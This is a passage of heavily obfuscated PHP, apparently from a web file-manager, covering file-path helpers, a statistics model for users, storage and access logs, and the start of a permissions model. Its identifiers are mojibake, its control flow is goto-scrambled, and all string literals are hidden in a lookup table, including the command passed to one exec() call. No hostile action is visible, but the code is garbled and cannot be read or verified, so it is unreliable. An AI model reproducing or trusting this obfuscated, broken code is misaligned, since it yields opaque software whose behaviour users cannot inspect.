$Fòø‘©ï->path; } } if ($b¯Œ”²‡™ì && self::local()->exist($b¯Œ”²‡™ì)) { $f¦»¢æÃÌ[$AÈäŒ™ˆ·İ[$A®íœ‹Â÷¹[76]]] = $b¯Œ”²‡™ì; } } if (!empty($f¦»¢æÃÌ)) { return array_values($f¦»¢æÃÌ); } show_json(LNG($A®íœ‹Â÷¹[1085]), !1); } public static function tmpFileName($AÜ×­ÎŠ‰¢) { $bó•¿Î â =& $_SERVER[›èö’ù¤]; $AœîØ®†  = array($AÜ×­ÎŠ‰¢[$bó•¿Î â[28]], $AÜ×­ÎŠ‰¢[$bó•¿Î â[76]], $AÜ×­ÎŠ‰¢[$bó•¿Î â[78]], $AÜ×­ÎŠ‰¢[$bó•¿Î â[516]]); return md5(implode($bó•¿Î â[71], $AœîØ®† )); } private static function localFilePath($B”¹ÛÈÂ‹¤, $A¥ƒ««ß¿) { goto Eµ­Å–; Cœ¯†©Úƒ: if ($E„øõÆŠ¥Û[$bÅÁ”ÄŞº[29]] == KodIO::KOD_SOURCE) { $e—ÈñÕ†ç¶ = Model($bÅÁ”ÄŞº[816])->fileInfoGet(KodIO::sourceID($B”¹ÛÈÂ‹¤)); if (!$e—ÈñÕ†ç¶[$bÅÁ”ÄŞº[76]]) { show_json($bÅÁ”ÄŞº[1124], !1); } $B”¹ÛÈÂ‹¤ = $e—ÈñÕ†ç¶[$bÅÁ”ÄŞº[76]]; } $b†©İÆ—ÔŒ = self::init($B”¹ÛÈÂ‹¤); $F‹Ÿ„‰ÂæÀ = $b†©İÆ—ÔŒ->getType(); goto eãêÌƒ•÷; Eµ­Å–: $bÅÁ”ÄŞº =& $_SERVER[›èö’ù¤]; if ($A¥ƒ««ß¿ == $bÅÁ”ÄŞº[1122] && strtoupper(substr(PHP_OS, 0, 3)) == $bÅÁ”ÄŞº[1123]) { return !1; } $E„øõÆŠ¥Û = KodIO::parse($B”¹ÛÈÂ‹¤); goto Cœ¯†©Úƒ; eãêÌƒ•÷: if ($F‹Ÿ„‰ÂæÀ == $bÅÁ”ÄŞº[106] || $F‹Ÿ„‰ÂæÀ == $bÅÁ”ÄŞº[1125]) { if (!$b†©İÆ—ÔŒ->exist($b†©İÆ—ÔŒ->path)) { show_json(LNG($bÅÁ”ÄŞº[105]), !1); } return $b†©İÆ—ÔŒ->path; } return !1; goto eò´ø§Á¹¯; eò´ø§Á¹¯: } private static function archiveExt($C¢–¦ƒİÅš = '') { $GLOBALS[$_SERVER[›èö’ù¤][1126]] = $C¢–¦ƒİÅš; } } goto fËÉ¨ˆÅ÷Ø; E†İ’¼ö¶Ú: class AnalysisModel extends ModelBaseLight { public function init($Bİ¥•ù”­ã) { $aéË×§”¸Û =& $_SERVER[›èö’ù¤]; $b±ÙùïÔ· = array($aéË×§”¸Û[589] => array($aéË×§”¸Û[29] => $aéË×§”¸Û[1646], $aéË×§”¸Û[271] => array($aéË×§”¸Û[222], $aéË×§”¸Û[749], $aéË×§”¸Û[1647], $aéË×§”¸Û[1648])), $aéË×§”¸Û[1649] => array($aéË×§”¸Û[29] => $aéË×§”¸Û[1650], $aéË×§”¸Û[271] => array($aéË×§”¸Û[222], $aéË×§”¸Û[747], $aéË×§”¸Û[1651], $aéË×§”¸Û[1652], $aéË×§”¸Û[1653]))); if (!isset($b±ÙùïÔ·[$Bİ¥•ù”­ã])) { return !1; } $this->optionType = $b±ÙùïÔ·[$Bİ¥•ù”­ã][$aéË×§”¸Û[29]]; $this->field = $b±ÙùïÔ·[$Bİ¥•ù”­ã][$aéË×§”¸Û[271]]; return !0; } public function listData($d¹ŒÕƒ«Ğµ = false, $B¡ƒ‹’éâ» = "\155\x6f\144\x69\146\x79\124\x69\x6d\145", $d£²¼äÇ„ô = false) { return parent::listData($d¹ŒÕƒ«Ğµ, $B¡ƒ‹’éâ», $d£²¼äÇ„ô); } public function trendList($b¥áê‰µµ•) { goto DöËª£Á¿®; DöËª£Á¿®: $bæ‹ˆƒ¡ƒô =& $_SERVER[›èö’ù¤]; $F‰„å„İªİ = $this->listData(); if ($F‰„å„İªİ) { $c»í¡ò‡„— = end($F‰„å„İªİ); $BÕÀ‰ËÚ‡Ï = date($bæ‹ˆƒ¡ƒô[1654], strtotime($bæ‹ˆƒ¡ƒô[1655])); if ($c»í¡ò‡„—[$bæ‹ˆƒ¡ƒô[222]] == $BÕÀ‰ËÚ‡Ï) { return $F‰„å„İªİ; } $DÚÄœœİ÷À = strtotime($c»í¡ò‡„—[$bæ‹ˆƒ¡ƒô[222]]); } goto a¢ê‹ÙÅ×; a¢ê‹ÙÅ×: if (!isset($DÚÄœœİ÷À)) { $Fô†§‡ØÕß = $b¥áê‰µµ• == $bæ‹ˆƒ¡ƒô[589] ? $bæ‹ˆƒ¡ƒô[533] : $bæ‹ˆƒ¡ƒô[816]; $DÚÄœœİ÷À = Model($Fô†§‡ØÕß)->min($bæ‹ˆƒ¡ƒô[194]); } $e­‹ò²ƒ¼® = $bæ‹ˆƒ¡ƒô[1656] . ucfirst($b¥áê‰µµ•); $e¯âÀ–Ï›Š = $this->dateList($DÚÄœœİ÷À); goto a¾ÃˆËÚí; a¾ÃˆËÚí: foreach ($e¯âÀ–Ï›Š as $BÕÀ‰ËÚ‡Ï) { $this->{$e­‹ò²ƒ¼®}($BÕÀ‰ËÚ‡Ï); } return $this->listData(); goto e½½Á­Ãœ ; e½½Á­Ãœ : } private function dateList($bø÷èÑÅ¦) { $b×åé‚Ïİ =& $_SERVER[›èö’ù¤]; $F”Å‹ïˆÀÑ = $bø÷èÑÅ¦; $Fäòë¡îÜø = strtotime($b×åé‚Ïİ[1655]); $Eø¶îŞœòù = array(); while ($F”Å‹ïˆÀÑ <= $Fäòë¡îÜø) { $Eø¶îŞœòù[] = date($b×åé‚Ïİ[1654], $F”Å‹ïˆÀÑ); $F”Å‹ïˆÀÑ = strtotime($b×åé‚Ïİ[1657], $F”Å‹ïˆÀÑ); } return $Eø¶îŞœòù; } public function _recordUser($Cšìê¸ê‹¢ = '') { goto f®ğõÂôÓ„; f®ğõÂôÓ„: $cç°ºïÕœŒ =& $_SERVER[›èö’ù¤]; $FÉ­œá½æÍ = strtotime(date($cç°ºïÕœŒ[1658], strtotime($Cšìê¸ê‹¢))); $e„Á¤á‚ç½ = strtotime(date($cç°ºïÕœŒ[1659], strtotime($Cšìê¸ê‹¢))); goto E™™§”õÍí; E™™§”õÍí: $AùÀİø˜Ò = array($cç°ºïÕœŒ[194] => array($cç°ºïÕœŒ[996], $e„Á¤á‚ç½)); $bò¸ÃĞ™ë¹ = Model($cç°ºïÕœŒ[533])->where($AùÀİø˜Ò)->count($cç°ºïÕœŒ[1551]); $AùÀİø˜Ò[$cç°ºïÕœŒ[194]] = array($cç°ºïÕœŒ[331], array($FÉ­œá½æÍ, $e„Á¤á‚ç½)); goto e„ÀŸ¬¹ØØ; a‹µ–Ø¹Úô: $BŞ†öƒ§Ü = array($cç°ºïÕœŒ[222] => $Cšìê¸ê‹¢, $cç°ºïÕœŒ[749] => (int) $bò¸ÃĞ™ë¹, $cç°ºïÕœŒ[1647] => (int) $F¬½¢ùëœ, $cç°ºïÕœŒ[1648] => (int) $b”Çš¸Şè©); return $this->insert($BŞ†öƒ§Ü); goto AÇ§¹‚îˆÏ; e„ÀŸ¬¹ØØ: $F¬½¢ùëœ = Model($cç°ºïÕœŒ[533])->where($AùÀİø˜Ò)->count($cç°ºïÕœŒ[1551]); $AùÀİø˜Ò[$cç°ºïÕœŒ[29]] = $cç°ºïÕœŒ[1660]; $b”Çš¸Şè© = Model($cç°ºïÕœŒ[1661])->where($AùÀİø˜Ò)->count($cç°ºïÕœŒ[1662]); goto a‹µ–Ø¹Úô; AÇ§¹‚îˆÏ: } public function _recordStore($eç£ˆÏÏªŸ = '') { goto C´åÚñ«İŸ; E£“çƒ˜í—: $aİ•µí‘Ï = Model($eßÀ‡ÈÖé[465])->where($bì¯È½Œš‚)->sum($eßÀ‡ÈÖé[78]); $bì¯È½Œš‚[$eßÀ‡ÈÖé[405]] = 0; $Dˆ—ò”Ì†Ì = Model($eßÀ‡ÈÖé[816])->where($bì¯È½Œš‚)->sum($eßÀ‡ÈÖé[78]); goto F·ìÕÄç; cÙİ: $Aî§İŒ³…‘ = Model($eßÀ‡ÈÖé[816])->where($bì¯È½Œš‚)->sum($eßÀ‡ÈÖé[78]); $cÆ½áÆ…¥« = array($eßÀ‡ÈÖé[222] => $eç£ˆÏÏªŸ, $eßÀ‡ÈÖé[747] => (int) $Dˆ—ò”Ì†Ì, $eßÀ‡ÈÖé[1651] => (int) $aİ•µí‘Ï, $eßÀ‡ÈÖé[1652] => (int) $D¿Áê¬Œ™, $eßÀ‡ÈÖé[1653] => (int) $Aî§İŒ³…‘); return $this->insert($cÆ½áÆ…¥«); goto cöšğ—èØò; C´åÚñ«İŸ: $eßÀ‡ÈÖé =& $_SERVER[›èö’ù¤]; $cİ°¤¸á½ = strtotime(date($eßÀ‡ÈÖé[1659], strtotime($eç£ˆÏÏªŸ))); $bì¯È½Œš‚ = array($eßÀ‡ÈÖé[194] => array($eßÀ‡ÈÖé[996], $cİ°¤¸á½)); goto E£“çƒ˜í—; F·ìÕÄç: $bì¯È½Œš‚[$eßÀ‡ÈÖé[406]] = 1; $D¿Áê¬Œ™ = Model($eßÀ‡ÈÖé[816])->where($bì¯È½Œš‚)->sum($eßÀ‡ÈÖé[78]); $bì¯È½Œš‚[$eßÀ‡ÈÖé[406]] = 2; goto cÙİ; cöšğ—èØò: } public function trend($d©ôÉÏ±¨, $bô­¿‡Ë) { goto E‹‚©›çòÑ; E˜ºîÎÊ­: return $aÆ³æÙ‹¡–; goto B¼Ú¼Ÿ˜ë÷; E‹‚©›çòÑ: $Dê’¤–¢îŠ =& $_SERVER[›èö’ù¤]; if (!$this->init($d©ôÉÏ±¨)) { return !1; } $EÙÅõĞôÃß = $this->trendList($d©ôÉÏ±¨); goto d‹š¬§âô; C¸ïØµ×: if (empty($EÙÅõĞôÃß)) { $c¯Î§„’Ğ‰ = date($Dê’¤–¢îŠ[1654], strtotime($Dê’¤–¢îŠ[1655])); $bŞÃª Š† = array($Dê’¤–¢îŠ[222] => $c¯Î§„’Ğ‰); foreach ($dö‘ÊÙ÷¬ñ[$d©ôÉÏ±¨] as $EØĞ„ôÚÃò => $CÙ‡»íÚÙŒ) { $bŞÃª Š†[$EØĞ„ôÚÃò] = 0; } $EÙÅõĞôÃß[] = $bŞÃª Š†; } $aÆ³æÙ‹¡– = array(); foreach ($EÙÅõĞôÃß as $CÙ‡»íÚÙŒ) { if ($d©ôÉÏ±¨ == $Dê’¤–¢îŠ[1649] && $CÙ‡»íÚÙŒ[$Dê’¤–¢îŠ[1651]] > $CÙ‡»íÚÙŒ[$Dê’¤–¢îŠ[747]]) { $CÙ‡»íÚÙŒ[$Dê’¤–¢îŠ[1651]] = $CÙ‡»íÚÙŒ[$Dê’¤–¢îŠ[747]]; } foreach ($dö‘ÊÙ÷¬ñ[$d©ôÉÏ±¨] as $EØĞ„ôÚÃò => $e‡—œ„ùÃŒ) { $C·¾ï’Ù×Ñ = array($Dê’¤–¢îŠ[222] => $CÙ‡»íÚÙŒ[$Dê’¤–¢îŠ[222]], $Dê’¤–¢îŠ[1454] => $e‡—œ„ùÃŒ); $C·¾ï’Ù×Ñ[$F…ÆÎù—Èä[$d©ôÉÏ±¨]] = isset($CÙ‡»íÚÙŒ[$EØĞ„ôÚÃò]) ? $CÙ‡»íÚÙŒ[$EØĞ„ôÚÃò] : 0; $aÆ³æÙ‹¡–[] = $C·¾ï’Ù×Ñ; } } goto E˜ºîÎÊ­; d‹š¬§âô: if ($EÙÅõĞôÃß && $bô­¿‡Ë != $Dê’¤–¢îŠ[1524]) { $DªÆÔÕÌëŸ = $EÙÅõĞôÃß[0][$Dê’¤–¢îŠ[222]]; $B“ˆƒÔ¯àá = $this->validDate($bô­¿‡Ë, $DªÆÔÕÌëŸ); $B—œãÌÂ = array(); $F†­†ôÂ‰ = array_to_keyvalue($EÙÅõĞôÃß, $Dê’¤–¢îŠ[222]); foreach ($B“ˆƒÔ¯àá as $c¯Î§„’Ğ‰) { if (isset($F†­†ôÂ‰[$c¯Î§„’Ğ‰])) { $C·¾ï’Ù×Ñ = $F†­†ôÂ‰[$c¯Î§„’Ğ‰]; } else { $C·¾ï’Ù×Ñ = end($EÙÅõĞôÃß); $C·¾ï’Ù×Ñ[$Dê’¤–¢îŠ[222]] = $c¯Î§„’Ğ‰; if ($d©ôÉÏ±¨ == $Dê’¤–¢îŠ[589]) { $C·¾ï’Ù×Ñ[$Dê’¤–¢îŠ[1647]] = $C·¾ï’Ù×Ñ[$Dê’¤–¢îŠ[1648]] = 0; } } $B—œãÌÂ[] = $C·¾ï’Ù×Ñ; } $EÙÅõĞôÃß = $B—œãÌÂ; } $dö‘ÊÙ÷¬ñ = array($Dê’¤–¢îŠ[589] => array($Dê’¤–¢îŠ[749] => LNG($Dê’¤–¢îŠ[1663]), $Dê’¤–¢îŠ[1647] => LNG($Dê’¤–¢îŠ[1664]), $Dê’¤–¢îŠ[1648] => LNG($Dê’¤–¢îŠ[1665])), $Dê’¤–¢îŠ[1649] => array($Dê’¤–¢îŠ[747] => LNG($Dê’¤–¢îŠ[1666]), $Dê’¤–¢îŠ[1651] => LNG($Dê’¤–¢îŠ[1667]), $Dê’¤–¢îŠ[1652] => LNG($Dê’¤–¢îŠ[1668]), $Dê’¤–¢îŠ[1653] => LNG($Dê’¤–¢îŠ[1669]))); $F…ÆÎù—Èä = array($Dê’¤–¢îŠ[589] => $Dê’¤–¢îŠ[1670], $Dê’¤–¢îŠ[1649] => $Dê’¤–¢îŠ[78]); goto C¸ïØµ×; B¼Ú¼Ÿ˜ë÷: } public function validDate($Däš­ŞÖÒì, $dÌÇÎ¼Ñ¶£) { goto bÖäŞ©êŸ•; A—òÇ•–¯: switch ($Däš­ŞÖÒì) { case $C÷¢é¨îšß[1531]: $BŒªÖä«ˆá = mktime(0, 0, 0, date($C÷¢é¨îšß[1671]), date($C÷¢é¨îšß[1277]) - date($C÷¢é¨îšß[1338]) + 7 - 7, date($C÷¢é¨îšß[1672])); $bô½Úà™Š¨ = 0; do { $D±¹ô¦î = date($C÷¢é¨îšß[1654], $BŒªÖä«ˆá - 3600 * 24 * 7 * $bô½Úà™Š¨); $d†‰Ì•«Ÿç[] = $D±¹ô¦î; $bô½Úà™Š¨++; } while ($dÌÇÎ¼Ñ¶£ < $D±¹ô¦î); break; case $C÷¢é¨îšß[1529]: $bô½Úà™Š¨ = 1; do { $CÂáÂ†óÎê = date($C÷¢é¨îšß[1673], strtotime("\x2d\40{$bô½Úà™Š¨}\40\x6d\157\156\164\150\x73")); $d†‰Ì•«Ÿç[] = $CÂáÂ†óÎê; $bô½Úà™Š¨++; } while ($dÌÇÎ¼Ñ¶£ < $CÂáÂ†óÎê); break; case $C÷¢é¨îšß[1674]: $f§Áñ›ºƒß = (int) date($C÷¢é¨îšß[1672], strtotime($dÌÇÎ¼Ñ¶£)); $cª½›«Øëò = (int) date($C÷¢é¨îšß[1672]); if ($f§Áñ›ºƒß >= $cª½›«Øëò) { break; } for ($f§Áñ›ºƒß; $f§Áñ›ºƒß < $cª½›«Øëò; $f§Áñ›ºƒß++) { $d†‰Ì•«Ÿç[] = $f§Áñ›ºƒß . $C÷¢é¨îšß[1675]; } break; default: break; } if ($dÌÇÎ¼Ñ¶£ > end($d†‰Ì•«Ÿç)) { array_pop($d†‰Ì•«Ÿç); } sort($d†‰Ì•«Ÿç); goto F‹ïÁç±š; bÖäŞ©êŸ•: $C÷¢é¨îšß =& $_SERVER[›èö’ù¤]; $Aãµ·Çàëî = date($C÷¢é¨îšß[1654], strtotime($C÷¢é¨îšß[1655])); $d†‰Ì•«Ÿç = array($Aãµ·Çàëî); goto A—òÇ•–¯; F‹ïÁç±š: return $d†‰Ì•«Ÿç; goto A÷”ƒÍÂ­; A÷”ƒÍÂ­: } public function listTable($cåÍ©Áø’Ë) { $C˜–„Ñƒ–ì = ucfirst($cåÍ©Áø’Ë); return Model($C˜–„Ñƒ–ì)->listData(); } public function option($eå±±ÂøŞĞ) { $bæ—‘ßÈ¯š = $_SERVER[›èö’ù¤][1676] . ucfirst($eå±±ÂøŞĞ); return $this->{$bæ—‘ßÈ¯š}(); } private function optionUser() { goto b †««· È; BÚà¹ƒÍí¾: return array($A¥…¬¹…Ÿ[743] => (int) $c¥‘í›…ŒÓ, $A¥…¬¹…Ÿ[1679] => (int) ($c¥‘í›…ŒÓ - $Fàˆ¡ÑÉó•), $A¥…¬¹…Ÿ[1680] => (int) $Fàˆ¡ÑÉó•, $A¥…¬¹…Ÿ[1681] => (int) $BêÊ‰ÂöŒ, $A¥…¬¹…Ÿ[1682] => $Béí§¤ª®); goto dç‡ÆÖÊÜÉ; bÙ›ªõöÇ: if ($e¦Ù·”ù¾¡ < $Aõ‚Ü˜Ô ô) { $e¦Ù·”ù¾¡ = $Aõ‚Ü˜Ô ô; } $EŞ£ÀÖ²Ó = array($A¥…¬¹…Ÿ[1678] => array($A¥…¬¹…Ÿ[997], $e¦Ù·”ù¾¡)); $Béí§¤ª® = (int) Model($A¥…¬¹…Ÿ[533])->where($EŞ£ÀÖ²Ó)->count($A¥…¬¹…Ÿ[1551]); goto E¥òœ²Ö’; E¥òœ²Ö’: if (!$Béí§¤ª®) { $Béí§¤ª® = 1; } $EŞ£ÀÖ²Ó = array($A¥…¬¹…Ÿ[1678] => array($A¥…¬¹…Ÿ[997], $Aõ‚Ü˜Ô ô)); $BêÊ‰ÂöŒ = Model($A¥…¬¹…Ÿ[533])->where($EŞ£ÀÖ²Ó)->count($A¥…¬¹…Ÿ[1551]); goto BÚà¹ƒÍí¾; b †««· È: $A¥…¬¹…Ÿ =& $_SERVER[›èö’ù¤]; $c¥‘í›…ŒÓ = Model($A¥…¬¹…Ÿ[533])->count($A¥…¬¹…Ÿ[1551]); $Fàˆ¡ÑÉó• = Model($A¥…¬¹…Ÿ[533])->where($A¥…¬¹…Ÿ[1677])->count($A¥…¬¹…Ÿ[1551]); goto CÕŒË‘¡«¶; CÕŒË‘¡«¶: $bâ‹öÄˆÕÄ = intval($GLOBALS[$A¥…¬¹…Ÿ[6]][$A¥…¬¹…Ÿ[347]][$A¥…¬¹…Ÿ[1510]]) / 3600; $e¦Ù·”ù¾¡ = strtotime("\x2d{$bâ‹öÄˆÕÄ}\x20\x68\157\165\162\x73"); $Aõ‚Ü˜Ô ô = strtotime(date($A¥…¬¹…Ÿ[1658])); goto bÙ›ªõöÇ; dç‡ÆÖÊÜÉ: } private function optionFile() { goto Då¢«¼†ˆæ; dÍª¤Áù­‚: $cê „¦İàŞ = Model($bˆÅ¾æù¯Ş[816])->where($bã›£œï»)->sum($bˆÅ¾æù¯Ş[78]); $DÖ±‹å¹© = Model($bˆÅ¾æù¯Ş[816])->where($bã›£œï»)->count($bˆÅ¾æù¯Ş[397]); return array($bˆÅ¾æù¯Ş[747] => $dÉİÈ†›, $bˆÅ¾æù¯Ş[1651] => $EêğÇ§ÍŸĞ, $bˆÅ¾æù¯Ş[1683] => $dÉİÈ†› - $EêğÇ§ÍŸĞ, $bˆÅ¾æù¯Ş[1684] => (int) $cê „¦İàŞ, $bˆÅ¾æù¯Ş[749] => (int) $d‡šùÀÆÁ, $bˆÅ¾æù¯Ş[1685] => (int) $DÖ±‹å¹©); goto F·ÙñÔ‡œê; Då¢«¼†ˆæ: $bˆÅ¾æù¯Ş =& $_SERVER[›èö’ù¤]; $E‘Ã°ŒË“ = $this->sourceSize(); $dÉİÈ†› = $E‘Ã°ŒË“[$bˆÅ¾æù¯Ş[78]]; goto c–ïß®ÃË‚; c–ïß®ÃË‚: $EêğÇ§ÍŸĞ = $E‘Ã°ŒË“[$bˆÅ¾æù¯Ş[1651]]; $d‡šùÀÆÁ = Model($bˆÅ¾æù¯Ş[816])->where(array($bˆÅ¾æù¯Ş[405] => 0))->count($bˆÅ¾æù¯Ş[397]); $bã›£œï» = array($bˆÅ¾æù¯Ş[405] => 0, $bˆÅ¾æù¯Ş[194] => array($bˆÅ¾æù¯Ş[997], strtotime(date($bˆÅ¾æù¯Ş[1658])))); goto dÍª¤Áù­‚; F·ÙñÔ‡œê: } private function optionAccess() { $eçš‰‰ØÁö =& $_SERVER[›èö’ù¤]; return array($eçš‰‰ØÁö[743] => $this->typeLogCnt(), $eçš‰‰ØÁö[107] => $this->typeLogCnt($eçš‰‰ØÁö[107]), $eçš‰‰ØÁö[445] => $this->typeLogCnt($eçš‰‰ØÁö[445]), $eçš‰‰ØÁö[1686] => $this->typeLogCnt($eçš‰‰ØÁö[1686]), $eçš‰‰ØÁö[1687] => $this->typeLogCnt($eçš‰‰ØÁö[1687]), $eçš‰‰ØÁö[589] => $this->typeLogCnt($eçš‰‰ØÁö[33], $eçš‰‰ØÁö[1662])); } private function typeLogCnt($d·À÷‚Ê = '', $d‘Ç§©Óò = "\151\144") { goto B‡Íí¶íöÌ; dİ»óˆÏ«ô: return (int) $C²êœÅš²È; goto e÷ÙÁÜ¿ğ; DÑİê·êÆ: $bÀ¡‘¯âš = array($EÉ†î†¹³[194] => array($EÉ†î†¹³[997], $cÜéÓ•‚‚)); if ($d·À÷‚Ê) { $bÀ¡‘¯âš[$EÉ†î†¹³[29]] = array($EÉ†î†¹³[7], $F÷ñ´ášØ‘[$d·À÷‚Ê]); } $C²êœÅš²È = Model($EÉ†î†¹³[1661])->where($bÀ¡‘¯âš)->count($d‘Ç§©Óò); goto dİ»óˆÏ«ô; B‡Íí¶íöÌ: $EÉ†î†¹³ =& $_SERVER[›èö’ù¤]; $F÷ñ´ášØ‘ = array($EÉ†î†¹³[107] => array($EÉ†î†¹³[1688], $EÉ†î†¹³[1689]), $EÉ†î†¹³[445] => array($EÉ†î†¹³[1690], $EÉ†î†¹³[1691]), $EÉ†î†¹³[1686] => array($EÉ†î†¹³[1692], $EÉ†î†¹³[1693], $EÉ†î†¹³[1694]), $EÉ†î†¹³[1687] => array($EÉ†î†¹³[1695], $EÉ†î†¹³[1696]), $EÉ†î†¹³[1697] => array($EÉ†î†¹³[1698], $EÉ†î†¹³[1699], $EÉ†î†¹³[1700])); $cÜéÓ•‚‚ = strtotime(date($EÉ†î†¹³[1658])); goto DÑİê·êÆ; e÷ÙÁÜ¿ğ: } private function optionServer() { goto c»ÊäƒŸ¸ô; E¥ôÆÂÃ  : if ($C‘À¤çó == $d³¼ß±‹‘[781]) { $CƒšÀˆ¨… = explode($d³¼ß±‹‘[1191], $bõÕô„Á…Ô[$d³¼ß±‹‘[957]]); $C‘À¤çó = $CƒšÀˆ¨…[0]; } if ($C‘À¤çó == $d³¼ß±‹‘[784] || $C‘À¤çó == $d³¼ß±‹‘[785]) { $d…Ó‚À·…Õ = Model()->db()->query($d³¼ß±‹‘[1701]); $FîÚÍ‰Ôœ½ = $d…Ó‚À·…Õ[0] && isset($d…Ó‚À·…Õ[0][$d³¼ß±‹‘[1453]]) ? $d…Ó‚À·…Õ[0][$d³¼ß±‹‘[1453]] : 0; $C‘À¤çó = $d³¼ß±‹‘[1702] . ($FîÚÍ‰Ôœ½ ? $d³¼ß±‹‘[8] . $FîÚÍ‰Ôœ½ : $d³¼ß±‹‘[33]); } $B±ÂãçËéø = $GLOBALS[$d³¼ß±‹‘[6]][$d³¼ß±‹‘[347]][$d³¼ß±‹‘[818]]; goto f§èÇŠöëŒ; céĞ‹›Œˆ«: $dòÄ«Ù©ÆÅ = array($d³¼ß±‹‘[808] => $F°’ÔäÛÊ®[$d³¼ß±‹‘[395]]); $fôÎ­‘õí = Model($d³¼ß±‹‘[465])->where($dòÄ«Ù©ÆÅ)->sum($d³¼ß±‹‘[78]); $fÜÚß‘¡Ó³ = explode($d³¼ß±‹‘[50], $_SERVER[$d³¼ß±‹‘[142]]); goto Fõ†Ê„ëéĞ; c»ÊäƒŸ¸ô: $d³¼ß±‹‘ =& $_SERVER[›èö’ù¤]; $A‹º¼îé…‘ = $this->diskDriver(); $F°’ÔäÛÊ® = KodIO::defaultDriver(); goto céĞ‹›Œˆ«; Fõ†Ê„ëéĞ: $fÙÈéÆİ‚‰ = $fÜÚß‘¡Ó³[0]; $bõÕô„Á…Ô = $GLOBALS[$d³¼ß±‹‘[6]][$d³¼ß±‹‘[17]]; $C‘À¤çó = $bõÕô„Á…Ô[$d³¼ß±‹‘[958]]; goto E¥ôÆÂÃ  ; f§èÇŠöëŒ: return array($d³¼ß±‹‘[1703] => $A‹º¼îé…‘ ? $A‹º¼îé…‘[$d³¼ß±‹‘[1704]] : 0, $d³¼ß±‹‘[1705] => $A‹º¼îé…‘ ? $A‹º¼îé…‘[$d³¼ß±‹‘[1706]] : 0, $d³¼ß±‹‘[1707] => (int) $F°’ÔäÛÊ®[$d³¼ß±‹‘[1704]] * 1024 * 1024 * 1024, $d³¼ß±‹‘[1708] => (int) $fôÎ­‘õí, $d³¼ß±‹‘[1709] => ucfirst($fÙÈéÆİ‚‰), $d³¼ß±‹‘[1710] => $d³¼ß±‹‘[1711] . PHP_VERSION, $d³¼ß±‹‘[1712] => phpBuild64() ? 64 : 32, $d³¼ß±‹‘[742] => str_replace($d³¼ß±‹‘[1713], $d³¼ß±‹‘[974], $C‘À¤çó), $d³¼ß±‹‘[347] => ucfirst($B±ÂãçËéø), $d³¼ß±‹‘[28] => $_SERVER[$d³¼ß±‹‘[1714]]); goto Cª×¡ò‘®ù; Cª×¡ò‘®ù: } private function diskDriver() { goto Eâßé‹Ó£›; Eâßé‹Ó£›: $a²ÓŠßÜ =& $_SERVER[›èö’ù¤]; $eÏÁö¹™óç = $a²ÓŠßÜ[8]; $AçšˆØÙŞ = $GLOBALS[$a²ÓŠßÜ[6]][$a²ÓŠßÜ[1715]] == $a²ÓŠßÜ[1716]; goto e˜ØÅáŸîİ; eá—£ø™Â…: $eŒÌ‚¼Š»± = $A›¾´š“ó® - @disk_free_space($eÏÁö¹™óç); return array($a²ÓŠßÜ[1704] => $A›¾´š“ó®, $a²ÓŠßÜ[1706] => $eŒÌ‚¼Š»±); goto Aê•ÀÅÜ¯ƒ; e˜ØÅáŸîİ: if ($AçšˆØÙŞ) { $eÏÁö¹™óç = $a²ÓŠßÜ[1717]; if (function_exists($a²ÓŠßÜ[1718])) { exec($a²ÓŠßÜ[1719], $DÃ‚ĞÕõ“ö); $eÏÁö¹™óç = $DÃ‚ĞÕõ“ö[1] . $a²ÓŠßÜ[8]; } } if (!file_exists($eÏÁö¹™óç)) { return; } $A›¾´š“ó® = @disk_total_space($eÏÁö¹™óç); goto eá—£ø™Â…; Aê•ÀÅÜ¯ƒ: } public function fileChart($Fƒàë†ñÍ–) { goto eÕƒŠ©Åñ; a­†Ò´ºÅÊ: $b†ïß¿¶ó = $this->sourceSize(); $D£·Õ©à—ƒ = array($eùÊÏİ ­è[493] => 0, $eùÊÏİ ­è[406] => 1); $a·‚·§äĞ = Model($eùÊÏİ ­è[816])->where($D£·Õ©à—ƒ)->sum($eùÊÏİ ­è[78]); goto C›ÙÏ—‘”Å; C›ÙÏ—‘”Å: $D£·Õ©à—ƒ[$eùÊÏİ ­è[406]] = 2; $FÜÍÎ‚¼À = Model($eùÊÏİ ­è[816])->where($D£·Õ©à—ƒ)->sum($eùÊÏİ ­è[78]); return array($eùÊÏİ ­è[747] => $b†ïß¿¶ó[$eùÊÏİ ­è[78]], $eùÊÏİ ­è[1651] => $b†ïß¿¶ó[$eùÊÏİ ­è[1651]], $eùÊÏİ ­è[1652] => (int) $a·‚·§äĞ, $eùÊÏİ ­è[1653] => (int) $FÜÍÎ‚¼À); goto eÍ‘‘¼¼…è; eÕƒŠ©Åñ: $eùÊÏİ ­è =& $_SERVER[›èö’ù¤]; if (isset($Fƒàë†ñÍ–[$eùÊÏİ ­è[1551]])) { return Model($eùÊÏİ ­è[816])->userFileTypeProfile($Fƒàë†ñÍ–[$eùÊÏİ ­è[1551]]); } if (isset($Fƒàë†ñÍ–[$eùÊÏİ ­è[1720]])) { return Model($eùÊÏİ ­è[816])->groupFileTypeProfile($Fƒàë†ñÍ–[$eùÊÏİ ­è[1720]]); } goto a­†Ò´ºÅÊ; eÍ‘‘¼¼…è: } private function sourceSize() { $Bà•Å·…šó =& $_SERVER[›èö’ù¤]; $CŒ§¡·•ˆ¸ = Model($Bà•Å·…šó[816])->where(array($Bà•Å·…šó[405] => 0))->sum($Bà•Å·…šó[78]); $b³š§ÒâÜé = Model($Bà•Å·…šó[465])->sum($Bà•Å·…šó[78]); if ($b³š§ÒâÜé > $CŒ§¡·•ˆ¸) { $b³š§ÒâÜé = $CŒ§¡·•ˆ¸; } return array($Bà•Å·…šó[78] => (int) $CŒ§¡·•ˆ¸, $Bà•Å·…šó[1651] => (int) $b³š§ÒâÜé); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $f¼ëøÚæ ë =& $_SERVER[›èö’ù¤]; $b‡Œ…˜Ö = array(array($f¼ëøÚæ ë[415] => LNG($f¼ëøÚæ ë[1721]), $f¼ëøÚæ ë[1722] => $f¼ëøÚæ ë[1723], $f¼ëøÚæ ë[1724] => 